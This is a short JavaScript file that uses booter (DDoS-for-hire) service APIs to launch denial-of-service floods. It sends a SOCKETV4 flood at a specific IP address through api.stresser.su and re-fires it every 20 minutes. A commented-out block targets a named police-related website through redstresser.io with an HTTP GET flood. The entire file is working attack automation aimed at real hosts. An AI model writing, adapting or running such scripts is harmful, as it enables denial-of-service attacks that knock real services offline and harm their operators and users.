var XMLHttpRequest = require('xhr2');
const xhr = new XMLHttpRequest();

function requestSystem() {
  xhr.open("GET", `https://api.stresser.su/start?user=YOUR_USER_ID&api_key=YOUR_KEY&host=http://192.185.222.91/%RAND%&time=1200&method=SOCKETV4&slots=2&request_method=POST&referrer=&post_data="%RAND%"&cookies=&user_agent=&origin=Worldwide`);
  xhr.send();
  xhr.responseType = "json";
  xhr.onload = () => {
    if (xhr.readyState == 4 && xhr.status == 200) {
      const data = xhr.response;
      console.log(data);
    } else {
      console.log(`Error: ${xhr.status}`);
    }
  };
}

requestSystem();
setInterval(requestSystem, 20 * 60 * 1000); // executa a cada 20 minutos

/*function requestForum(){
  xhr.open("GET", "https://redstresser.io/complexx/layer7.php?type=start&host=https://www.policiarcc.com/&port=443&time=30&method=HTTPGET&totalservers=1&vip=undefined");
  xhr.send();
  xhr.responseType = "json";
  xhr.onload = () => {
    if (xhr.readyState == 4 && xhr.status == 200) {
      const data = xhr.response;
      console.log(data);
    } else {
      console.log(`Error: ${xhr.status}`);
    }
  };

  requestForum();

}*/